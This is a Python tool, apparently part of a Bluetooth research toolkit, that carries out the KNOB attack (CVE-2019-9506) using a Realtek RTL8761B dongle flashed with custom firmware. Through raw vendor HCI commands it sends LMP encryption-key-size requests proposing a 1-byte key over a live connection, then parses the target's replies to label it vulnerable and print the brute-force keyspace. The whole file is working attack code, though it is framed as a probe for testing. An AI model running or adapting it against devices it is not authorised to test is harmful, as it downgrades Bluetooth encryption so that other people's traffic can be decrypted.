#!/usr/bin/env python3
"""KNOB Attack Probe (CVE-2019-9506) for DarkFirmware RTL8761B.

Tests whether a connected Bluetooth target accepts a 1-byte encryption key.
Sends LMP_ENCRYPTION_KEY_SIZE_REQ(key_size=1) and monitors the response.

Usage:
    1. Connect to target device first: bluetoothctl connect <ADDR>
    2. sudo hciconfig hci1 down  (release kernel driver)
    3. sudo python3 knob_probe.py [--rounds N] [--conn-index N]

IMPORTANT: Must have an active ACL connection BEFORE running this tool.
           The DarkFirmware must be loaded (run Patch Writer first).

Results:
    VULNERABLE:     Target accepted key_size=1
    NEGOTIATING:    Target counter-proposed with larger key (iterating)
    NOT_VULNERABLE: Target rejected with error
    UNKNOWN:        No response received
"""

import sys
import time
import struct
import argparse

import usbbluetooth
from darkfirmware_utils import (find_realtek_device, send_lmp, collect_lmp_logs,
                                 recv_raw_bytes, MARKER_AAAA, LMP_OPCODES)
from scapy_usbbluetooth import UsbBluetoothSocket
from scapy.packet import Packet, bind_layers
from scapy.fields import ByteField, XLEIntField, XStrLenField, XByteField
from scapy.layers.bluetooth import HCI_Hdr, HCI_Command_Hdr, HCI_Event_Hdr, HCI_Event_Command_Complete

# LMP opcodes (raw, before <<1|TID encoding)
LMP_ACCEPTED = 0x03
LMP_NOT_ACCEPTED = 0x04
LMP_ENCRYPTION_KEY_SIZE_REQ = 0x10

# HCI packet classes
class HCI_Cmd_VSC_Xeno_Send_LMP(Packet):
    name = "Xeno VSC Send LMP"
    fields_desc = [XStrLenField("data", b"", length_from=lambda pkt: pkt.underlayer.underlayer.len)]

class HCI_Cmd_VSC_Realtek_Read_Mem(Packet):
    name = "Realtek Read Memory"
    fields_desc = [ByteField("size", 0x20), XLEIntField("address", 0x80000000)]

class HCI_Cmd_Complete_VSC(Packet):
    name = 'VSC complete'
    fields_desc = [XStrLenField("data", 0, length_from=lambda pkt: pkt.underlayer.underlayer.len)]

bind_layers(HCI_Command_Hdr, HCI_Cmd_VSC_Xeno_Send_LMP, ogf=0x3f, ocf=0x0222)
bind_layers(HCI_Command_Hdr, HCI_Cmd_VSC_Realtek_Read_Mem, ogf=0x3f, ocf=0x0061)
bind_layers(HCI_Event_Command_Complete, HCI_Cmd_Complete_VSC, opcode=0xfe22)
bind_layers(HCI_Event_Command_Complete, HCI_Cmd_Complete_VSC, opcode=0xfc61)

MARKER_AAAA = 0x41414141


def find_realtek_device():
    controllers = usbbluetooth.list_controllers()
    for c in controllers:
        if ((c.vendor_id == 0x0bda and c.product_id == 0xa728) or
            (c.vendor_id == 0x0bda and c.product_id == 0xa729) or
            (c.vendor_id == 0x2c0a and c.product_id == 0x8761) or
            (c.vendor_id == 0x2550 and c.product_id == 0x8761) or
            (c.vendor_id == 0x2357 and c.product_id == 0x0604)):
            return c
    return None


def send_lmp(sock, conn_index, lmp_data):
    """Send an LMP packet via VSC 0xFE22.

    New format: [conn_index:1B] [lmp_data:NB]
    """
    payload = bytes([conn_index]) + lmp_data
    pkt = HCI_Hdr() / HCI_Command_Hdr(ogf=0x3f, ocf=0x0222) / HCI_Cmd_VSC_Xeno_Send_LMP(data=payload)
    resp = sock.sr1(pkt, verbose=0)
    return resp


def collect_events(sock, timeout_sec=2.0):
    """Collect LMP RX log events (HCI Event 0xFF with AAAA marker)."""
    return collect_lmp_logs(sock, timeout_sec)


def parse_lmp_response(params):
    """Parse an LMP RX log to extract opcode and key details."""
    payload = params[0x18:0x34]  # 28-byte LMP payload region

    # LMP data typically at offset 4 within payload (first 4 bytes often zero)
    if len(payload) < 6:
        return None

    lmp_byte = payload[4]  # Raw on-air byte: (opcode << 1) | TID
    opcode = lmp_byte >> 1
    tid = lmp_byte & 1

    result = {"opcode": opcode, "tid": tid, "raw_byte": lmp_byte}

    if opcode == LMP_ACCEPTED:
        result["accepted_opcode"] = payload[5] >> 1 if len(payload) > 5 else None
        result["type"] = "ACCEPTED"
    elif opcode == LMP_NOT_ACCEPTED:
        result["rejected_opcode"] = payload[5] >> 1 if len(payload) > 5 else None
        result["error_code"] = payload[6] if len(payload) > 6 else None
        result["type"] = "NOT_ACCEPTED"
    elif opcode == LMP_ENCRYPTION_KEY_SIZE_REQ:
        result["key_size"] = payload[5] if len(payload) > 5 else None
        result["type"] = "KEY_SIZE_REQ"
    else:
        result["type"] = f"OTHER(0x{opcode:02x})"

    return result


def main():
    parser = argparse.ArgumentParser(description="KNOB Attack Probe (CVE-2019-9506)")
    parser.add_argument("--rounds", type=int, default=10, help="Max negotiation rounds")
    parser.add_argument("--conn-index", type=int, default=0, help="Connection slot index (0-11)")
    parser.add_argument("--key-size", type=int, default=1, help="Proposed key size (1-16)")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between rounds (sec)")
    args = parser.parse_args()

    ctrl = find_realtek_device()
    if ctrl is None:
        print("[!] No Realtek device found")
        sys.exit(1)

    sock = UsbBluetoothSocket(ctrl)
    print(f"[+] Connected to DarkFirmware dongle")
    print(f"[*] KNOB probe: key_size={args.key_size}, max_rounds={args.rounds}, conn_index={args.conn_index}")
    print()

    final_result = "UNKNOWN"

    for round_num in range(1, args.rounds + 1):
        print(f"--- Round {round_num}/{args.rounds} ---")

        # Send LMP_ENCRYPTION_KEY_SIZE_REQ(key_size)
        lmp_pdu = bytes([LMP_ENCRYPTION_KEY_SIZE_REQ, args.key_size])
        print(f"  TX: LMP_ENCRYPTION_KEY_SIZE_REQ(key_size={args.key_size})")
        send_lmp(sock, args.conn_index, lmp_pdu)

        # Wait and collect responses
        time.sleep(args.delay)
        events = collect_events(sock, timeout_sec=2.0)

        if not events:
            print(f"  RX: (no LMP response)")
            continue

        for evt in events:
            parsed = parse_lmp_response(evt)
            if parsed is None:
                continue

            if parsed["type"] == "ACCEPTED":
                if parsed.get("accepted_opcode") == LMP_ENCRYPTION_KEY_SIZE_REQ:
                    print(f"  RX: LMP_ACCEPTED for KEY_SIZE_REQ — TARGET ACCEPTED key_size={args.key_size}!")
                    final_result = "VULNERABLE"
                else:
                    print(f"  RX: LMP_ACCEPTED for opcode 0x{parsed.get('accepted_opcode', 0):02x}")

            elif parsed["type"] == "NOT_ACCEPTED":
                error = parsed.get("error_code", 0)
                print(f"  RX: LMP_NOT_ACCEPTED for opcode 0x{parsed.get('rejected_opcode', 0):02x}, error=0x{error:02x}")
                if parsed.get("rejected_opcode") == LMP_ENCRYPTION_KEY_SIZE_REQ:
                    final_result = "NOT_VULNERABLE"

            elif parsed["type"] == "KEY_SIZE_REQ":
                counter_size = parsed.get("key_size", 0)
                print(f"  RX: LMP_ENCRYPTION_KEY_SIZE_REQ(key_size={counter_size}) — target counter-proposes")
                if counter_size <= args.key_size:
                    final_result = "VULNERABLE"
                else:
                    final_result = "NEGOTIATING"
                    # Continue next round with same proposed size

            else:
                print(f"  RX: {parsed['type']} (raw=0x{parsed['raw_byte']:02x})")

        if final_result in ("VULNERABLE", "NOT_VULNERABLE"):
            break

    print()
    print("=" * 60)
    if final_result == "VULNERABLE":
        print(f"[!!!] VULNERABLE to KNOB (CVE-2019-9506)")
        print(f"      Target accepted encryption key size = {args.key_size} byte(s)")
        print(f"      Brute-force space: {256**args.key_size} keys")
    elif final_result == "NOT_VULNERABLE":
        print(f"[OK]  NOT VULNERABLE to KNOB")
        print(f"      Target rejected key_size={args.key_size}")
    elif final_result == "NEGOTIATING":
        print(f"[??]  INCONCLUSIVE — target counter-proposed after {args.rounds} rounds")
        print(f"      May need more rounds or different strategy")
    else:
        print(f"[??]  UNKNOWN — no LMP response received")
        print(f"      Is there an active ACL connection to the target?")
    print("=" * 60)


if __name__ == "__main__":
    main()
